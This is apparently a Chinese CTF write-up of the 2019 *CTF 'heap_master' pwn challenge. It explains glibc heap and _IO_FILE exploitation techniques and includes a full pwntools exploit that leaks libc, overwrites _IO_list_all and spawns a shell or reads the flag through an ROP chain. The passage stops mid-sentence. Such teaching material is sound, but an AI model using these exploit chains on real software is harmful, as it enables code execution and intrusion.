    <content type="text"><![CDATA[作为2019*CTF的倒数第二题pwn题，这道题的程序逻辑却意外的简单，这也就意味着利用起来会有不小的困难（一般程序复杂的题洞难找但利用起来不会太过刁难，程序简单的题利用起来反而困难）。 这道heap_master从名字看就知道需要对ptmalloc2的机制和堆的各种利用方法都非常熟悉才能成为heap_master而不是heap_baby。。QAQ。。。这篇文章也算是集百家之长了。。。借鉴了天枢的师傅和其他一些大师傅的wp，又查了许多资料才汇总出这一篇拙作。 heap_master 一些必须知道的前置知识准备和利用手段：global_fast_max:简答的来说global_fast_max就是一个全局变量，他的作用是控制fastbinY[]的阈值，正常情况下其值为0x80，也就是大小在0x80之内的都可以放进fastbinY[]里，所以如果更改了global_max_fast的值，那fastbinY[]的范围将超标，实现fastbin_index_overflow，所以当我们free一个size极大且经过精心构造的victim_chunk时，就实现了可以几乎任意地址（在main_arena+88之后）写入victim_chunk的地址，之后比较常见的几种利用方式是： 改写_IO_list_all，伪造_IO_file_plus来劫持程序控制流。 改写stdout流，使其指向我们可控的地址，并在其上伪造一个IO_file_plus，常用来泄露libcbase。 stdin同上，但可以用来任意地址写。 stderr同上，但有更多的姿势。 改写__free_hook为system_addr，第五种方法就是利用这个。 size的计算方式为： 123fastbin_ptr = main_arena_addr + 8idx = (target_addr - fastbin_ptr) / 8 #target_addr为我们想要写入的地址。size = idx*0x10 + 0x20 #size为我们应该free的chunk的大小。 dl_open_hook:这种控制程序执行的方式是官方wp里面提到的，通过largebin attack/unsortedbina attack可以将_dl_open_hook覆盖为mmap出来的内存的地址，然后通过malloc或free报错的方式（也就是malloc_printerr），程序将会调用__libc_dlopen_mode函数，在其中会把dl_open_hook的值加载到某个寄存器，然后会call该寄存器，也就是我们获得一次劫持程序ip的机会，但是寄存器们却没法控制，需要和下面我们要讲的setcontext结合来使用才能发挥最大威力。图片来源e3pem setcontext:在pwndbg的magic功能中，我们看到有setcontext+0x35这个变量，现在终于用到了。 看一下这个玩意到底是啥： 12345678910111213141516170x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0]0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80]0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78]0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48]0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50]0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58]0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60]0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8]0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70]0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88]0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98]0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28]0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30]0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68]0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax0x7ffff7a7a5af &lt;setcontext+127&gt;: ret 我们可以看到这一段巨型gadget，几乎控制了我们所有的寄存器，只要我们可以控制rdi所指向的地址及其后0xa8的内容，就可以劫持程序执行流了。其中这几个位置比较重要： 12345678rsp = [rdi+0xa0]ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。rdi = [rdi+0x68]rsi = [rdi+0x70]rdx = [rdi+0x88]rcx = [rdi+0x98]r8 = [rdi+0x28]r9 = [rdi+0x30] __after_morecore_hook:这玩意和setcontext+53一样，我也是在magic命令里发现了他，现在找了不少资料也没有完全搞懂他的用法，大致的用法是在sysmalloc里操作系统被要求更多内存后，调用sbrk之后使用： 1234567891011if (brk != (char *) (MORECORE_FAILURE)) //sbrk分配成功 &#123; /* Call the `morecore' hook if necessary. */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); //&lt;------这里 &#125;else &#123; …… &#125; 如果sbrk分配成功，并且MORECORE的__after_morecore_hook函数存在，则调用这个函数。（还不清楚其原本目的是用来干嘛的）。待我啃一啃sysmalloc源码之后再来尝试利用这个破玩意，现在似乎还没出现以他为利用方式为题目。 chroot:chroot作用：chroot命令改变其当前目录，并将根目录变为指定目录，然后如果提供了命令则运行命令，也可以运行一个用户的交互式shell的副本。由chroot创造出的那个根目录，叫做“chroot监狱”（chroot jail，或chroot prison） 这道题就使用了chroot来使我们没法拿shell，只能通过orw来读取flag。 timeout 60 chroot –userspec=pwn:pwn ./ ./heap_master 这句话的意思是：运行时间不超过60s，使用pwn用户组的pwn用户，以当前文件夹为根目录，运行./heapmaster 超过60秒就kill掉进程。因为当前目录为根目录，所以我们就没办法打开shell了，因为当前目录啥都没有，没有bin，也没有sh（可执行文件），应该只有一个flag文件，还有一些其他的配置文件，所以肯定要使用orw来直接读flag。 mprotect与mmap:两个函数的man手册描述： 123456789101112131415161718192021222324252627282930NAME mprotect — set protection of memory mappingSYNOPSIS #include &lt;sys/mman.h&gt; int mprotect(void *addr, size_t len, int prot);DESCRIPTION The mprotect() function shall change the access protections to be that speci‐ fied by prot for those whole pages containing any part of the address space of the process starting at address addr and continuing for len bytes. The parame‐ ter prot determines whether read, write, execute, or some combination of accesses are permitted to the data being mapped. The prot argument should be either PROT_NONE or the bitwise-inclusive OR of one or more of PROT_READ, PROT_WRITE, and PROT_EXEC.NAME mmap — map pages of memorySYNOPSIS #include &lt;sys/mman.h&gt; void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);DESCRIPTION The mmap() function shall establish a mapping between an address space of a process and a memory object. mprotect函数用于改变某段地址的权限（rwxp） 这道题目开启了 NX 保护，因此可以考虑通过mprotect改变mmap_addr的权限，然后注入shellcode再劫持程序执行流，mprotect指定的内存区必须包含整个内存页，区间长度必须是页大小的整数倍，重点介绍如何使用mprotect。 函数原型是int mprotect(void *addr, size_t len, int prot);，addr是内存地址开头，len 是长度，prot 就是权限位，在 manpage 上有 PROT_WRITE、PROT_EXEC、PROT_READ 等几项，权限是位运算之后的数字，根据宏定义， rwx权限 就是 0x1 | 0x2 | 0x4，也就是7。 mmap用于申请一段空间，根据参数不同可以设置这段空间的权限。 mmap可以申请一段空间，但麻烦在需要控制 6 个参数，对 64 位的程序而言，也就是需要找到能控制 rdi, rsi, rdx, rcx, r8, r9 的 gadget，大部分情况是需要和setcontext+53配合使用。具体使用方法我就不赘述了。 _IO_str_jumps与_IO_list_all：_IO_file_pwn是现在最常用的pwn手段之一，因为没有程序能离开他，只要有输入输出函数和报错(malloc_printerr，exit()甚至main return)的机会，就有可能使用到_IO_file_pwn。之前也做了不少题目关于这个方面的，在这里终于有机会自己总结一下了。。。先亮出三个结构体。 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* offset 0x68 (64bits) */ int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE //开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）&#125;;struct _IO_FILE_complete&#123; struct _IO_FILE _file;#endif //结束宏判断#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001 //依然是_IO_FILE的内容 _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf;# else void *__pad1; void *__pad2; void *__pad3; void *__pad4;# endif size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;; _IO_file的利用主要分为两种： 利用stdout和stdin文件输入输出流进行地址泄露和数据修改。 利用_IO_list_all进行程序控制流的劫持。 第一种利用方式：泄露地址的利用方法很简单，只要有办法向_IO_2_1_stdout结构体写入东西，就有机会成功，需要达成两个条件：（之后会根据题目详解两个条件） f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1 _IO_write_base!=_IO_write_ptr 任意地址写的条件比较苛刻，题目好久之前做过一道，具体都记不清了，有时间再来总结：2018_hctf_babyprintf_ver2 第二种利用方式：通过_IO_list_all劫持程序控制流。我们大家最熟悉的house of orange就是在libc2.23下诞生的在当时最新型的利用方式，网上大师傅们的分析也非常全面细致，我就不再浪费时间了，以下结构体和函数源码部分摘抄与veritas501 house_of_orange最后的劫持程序执行流部分： 我们在malloc的时候程序会出错，调用malloc_printerr函数，如下 1234if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);c 而malloc_printerr则又调用了__libc_message。 1234567891011121314151617181920212223242526static voidmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)&#123; /* Avoid using this arena in future. We do not attempt to synchronize this with anything else because we minimally want to ensure that __libc_message gets its resources safely without stumbling on the current corruption. */ if (ar_ptr) set_arena_corrupt (ar_ptr); if ((action &amp; 5) == 5) __libc_message (action &amp; 2, "%s\n", str); else if (action &amp; 1) &#123; char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\0'; char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0); while (cp &gt; buf) *--cp = '0'; __libc_message (action &amp; 2, "*** Error in `%s': %s: 0x%s ***\n", __libc_argv[0] ? : "&lt;unknown&gt;", str, cp); &#125; else if (action &amp; 2) abort ();&#125; 而__libc_message则又调用了abort。 1234567891011121314/* Abort with an error message. */void__libc_message (int do_abort, const char *fmt, ...)&#123;...... if (do_abort) &#123; BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort ();//调用abort &#125;&#125; 而abort则又调用了fflush。 123456789101112131415/* Cause an abnormal program termination with core-dump. */voidabort (void)&#123;...... /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) &#123; ++stage; fflush (NULL);//调用fflush &#125; ...... 而fflush其实就是_IO_flush_all_lockp。 1#define fflush(s) _IO_flush_all_lockp (0) 而_IO_flush_all_lockp中用到了_IO_list_all，并最终通过vtable调用了_IO_OVERFLOW。 12345678910111213141516171819202122232425262728293031323334int _IO_flush_all_lockp (int do_lock)&#123;...... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; //_IO_list_all赋给fp while (fp != NULL) &#123;...... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)//需要bypass的条件#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))//需要bypass的条件#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 system 劫持程序流！ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain;//指向下一个fp（从main_arena到heap） &#125;......&#125; 由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件必须满足，即： 1234561.fp-&gt;_mode &lt;= 02.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或1._IO_vtable_offset (fp) == 02.fp-&gt;_mode &gt; 03.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base （主推第一种。。。） 主要想总结一下libc2.24以后的利用方法。 glibc2.24下：因为glibc2.24对vtable指针进行了检查，所以我们就不能自由改写vtable了，但是随之而来的产生了一个新的方法：利用_IO_str_jumps结构体，其和IO_jump_t一样，其成员也全部是函数指针。 123456789101112131415161718192021222324pwndbg&gt; p _IO_str_jumps $1 = &#123; __dummy = 0, __dummy2 = 0, __finish = 0x7ff39312db70 &lt;_IO_str_finish&gt;, __overflow = 0x7ff39312d850 &lt;__GI__IO_str_overflow&gt;, __underflow = 0x7ff39312d7f0 &lt;__GI__IO_str_underflow&gt;, __uflow = 0x7ff39312c370 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ff39312db50 &lt;__GI__IO_str_pbackfail&gt;, __xsputn = 0x7ff39312c3d0 &lt;__GI__IO_default_xsputn&gt;, __xsgetn = 0x7ff39312c550 &lt;__GI__IO_default_xsgetn&gt;, __seekoff = 0x7ff39312dca0 &lt;__GI__IO_str_seekoff&gt;, __seekpos = 0x7ff39312c730 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ff39312c600 &lt;_IO_default_setbuf&gt;, __sync = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __doallocate = 0x7ff39312c7a0 &lt;__GI__IO_default_doallocate&gt;, __read = 0x7ff39312d6a0 &lt;_IO_default_read&gt;, __write = 0x7ff39312d6b0 &lt;_IO_default_write&gt;, __seek = 0x7ff39312d680 &lt;_IO_default_seek&gt;, __close = 0x7ff39312c9b0 &lt;_IO_default_sync&gt;, __stat = 0x7ff39312d690 &lt;_IO_default_stat&gt;, __showmanyc = 0x7ff39312d6c0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ff39312d6d0 &lt;_IO_default_imbue&gt;&#125; 我们主要把目光放到两个函数上： _IO_str_overflow（_GI_IO_str_overflow）:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int _IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES)// pass return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ // pass return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen)//pass 一般会通过 return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);//target [fp+0xe0] if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow) 我们可以固定的这么构造： 1234567_flags = 0_IO_write_ptr = 0x7fffffffffffffff //极大即可_IO_write_base = 0_IO_buf_end = (binsh_addr-100)/2 //(rdi-100)/2_IO_buf_base = 0fp+0xe0 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps 我们把_IO_list_all的值改为我们可控的地址，在这个地址上伪造_IO_file_plus，将vtable设为_IO_str_jumps的地址，然后当程序发生：malloc_printerr，exit()，main函数return之一时，程序就会调用：__libc_message-&gt;abort-&gt;fllush/_IO_flush_all_lockp(从_IO_list_all开始清理文件结构体)-&gt;伪造的vtable(_IO_str_jumps_addr)-&gt;调用_IO_str_overflow-&gt;获得一次任意地址call的机会。 _IO_str_finish:这个函数要比_IO_str_overflow要简单的多。 12345678void _IO_str_finish (_IO_FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) //唯一需要bypass的条件 (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);// getshell ， [fp+0xe8] fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 我们可以这样构造： 1234_flags = 0_IO_buf_base = binsh_addr //rdifp+0xe8 = addr_of_func/gadget/one_gadgetfp+0xd8 = addr_of_IO_str_jumps - 8 在这道题中会显示这两个函数的具体使用方法。 第一种方法：思路：第一种方法是用largebin_attack的两次向任意地址写victim的地址，来对stdout结构体的flag(需满足f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1)和_IO_write_base的最后一个字节（错位写入，修改_IO_read_base的前七个字节和_IO_write_base的最后一个字节，victim的地址长度不够八个字节会将缺的位自动当为零写入）进行修改，利用mmap地址的随机性（大概1/16的概率）可以泄露出mmap的地址的基址和libc的地址。 然后再利用largebin_attack向_IO_list_all写入victim的地址，在victim处伪造一个fake_IO_file_plus，利用exit()中的_IO_flush_all_lockp调用_IO_str_overflow（所以在fp+0xd8处（也就是vtable处）我们应填入_IO_str_jumps的地址），利用_IO_str_overflow中的call [rdi+0xe0]来进行程序控制流的劫持(rdi里装的是_IO_str_overflow的第一个参数fp，也就是当前的文件结构体指针)，这里因为远程只能用orw(open read write)来读取flag，但是在本地的话可以直接用one_gadget或者system(&#39;/bin/sh\x00&#39;)来打开shell，所以在exp的最后地方会有一个分支。 除此之外，我还用了上面已经说过了的_IO_str_overflow和_IO_str_finish的方法来劫持程序执行流，具体的构造方法上面已经说得很详细 ，而且可以根据具体情况自己调试来自己修改构造。对于choice = 4的orw的思路，我是借鉴了天枢e3pem学长的题解，他的文章已经说得很清晰明了，包括在libc-2.25的环境下的调试和exp学长也已经给出，我就不敢再赘述（在文末已贴出链接）。 exp如下(libc-2.23)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new_(p,size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade_(p,offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete_(p,offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): while 1: try: p = process('./heap_master') new = lambda x: new_(p,x) upgrade = lambda x,y: upgrade_(p,x,y) delete = lambda x: delete_(p,x) offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- _IO_list_all_addr = libcbase + 0x3c5520 _IO_str_jumps_addr = libcbase + 0x7f1517e807a0 - 0x7f1517abd000 log.success('_IO_list_all_addr = '+hex(_IO_list_all_addr)) log.success('_IO_str_jumps_addr = '+hex(_IO_str_jumps_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(_IO_list_all_addr-0x20)) delete(offset+0x10) new(0x60) #------------------------modify_IO_list_all success------------------------------- choice = 1 #1:one_gadget 2:_IO_str_finish:system('/bin/sh\x00') 3:_IO_str_overflow:system('/bin/sh\x00') 4:orw if choice == 1: one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147] upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + one_gadget[1])) if choice == 2: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(1) #_IO_write_ptr fake_IO_file+= p64(1) #_IO_write_end fake_IO_file+= p64(mmap_addr) #_IO_buf_base = addr_of_bin_sh upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr-8)) upgrade(offset+0xe8,p64(libcbase + libc.sym['system'])) if choice == 3: fake_IO_file = p64(0) #flag = 0 fake_IO_file+= p64(0)*3 fake_IO_file+= p64(0) #_IO_write_base fake_IO_file+= p64(0xffffffff) #_IO_write_ptr fake_IO_file+= p64(0) #_IO_write_end fake_IO_file+= p64(0) #_IO_buf_base = 0 fake_IO_file+= p64((mmap_addr-100)/2) #_IO_buf_base = (arry_addr-100)/2 upgrade(0,'/bin/sh\x00') upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(libcbase + libc.sym['system'])) if choice == 4: p_rdi = libcbase + 0x21102 p_rdx_rsi = libcbase + 0x1150c9 p_rsp = libcbase + 0x3838 p_rsp_r13 = libcbase + 0x206c3 p_rbx_rbp_j_rdx = libcbase + 0x12d751 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,3, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x1000, libcbase+libc.sym['write'], ] fake_IO_file = p64(0) fake_IO_file+= p64(p_rsp) fake_IO_file+= p64(mmap_addr+8) fake_IO_file+= p64(0) fake_IO_file+= p64(0) fake_IO_file+= p64(p_rsp_r13) upgrade(0,'./flag\x00\x00' + flat(orw)) upgrade(offset,fake_IO_file) upgrade(offset+0xd8,p64(_IO_str_jumps_addr)) upgrade(offset+0xe0,p64(p_rbx_rbp_j_rdx)) #gdb.attach(p) p.recvuntil('&gt;&gt; ') p.sendline('0') break except: p.close() p.interactive()if __name__ == '__main__': mypwn() 心得： 关于f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，这个flag的构造方法其实很简单，分成两部分来看，第一部分：f-&gt;flag &amp; 0xa00!=NULL，和1010 0000 0000按位与不为NULL的话，很简单只要保证是0x8xx或者0x2xx或者0xaxx就行了，这也是为什么我们看到的很多构造是flag = 0xfbad1800或者0xfbad2877啥的，其后三位都是0x8xx，第二部分：f-&gt;flag &amp; 0x1000 == 1，这个更简单了，和0001 0000 0000 0000按位与不为0即可，这个利用mmap地址的随机性随便都能成立吧。 我们选择进行largebin_attack的两块chunk的大小不能随意选择或差距过大，因为一条链的chunk大小是有范围的，（看表格你会发现好像我这道题用的chunk的size（0x4f0和0x510）明明是分在两个链上的。。但实际上那个size=0x4f0的chunk之前的size是等于0x510的，我是先把他放进去再改的大小。。。正常情况是不能这么做的。）图片来源:veritas501 一次largebin_attack可以向任意两个地址同时写victim_addr一次，一次unsortedbin_attack可以向一个任意地址写main_arena+88一次，但是写完之后这条largebin和unsortedbin都会损坏，如需继续使用我们需要注意修补。（largebin可以直接换一条链。。） 这题如果可以直接拿shell倒也不是很难，我觉得难点主要在于两方面，一方面是环境是2.25，对我这种一直用虚拟机的玩家来说怎么在ubuntu16.04上运行2.25的libc和ld.so是需要面对的第一个问题，好在这个已经得到初步解决（看e3pme的文章），一方面是orw让我们必须劫持栈rsp到mmap的我们自己已经填好rop_chain的地址上，加上找gadgets等一系列麻烦事，使难度上了一个档次。 第二种方法：第二种方法的泄露方法和第一种方法一样，但是改变了控制程序执行流的方法。 思路分析：第二种方法我们使用modify 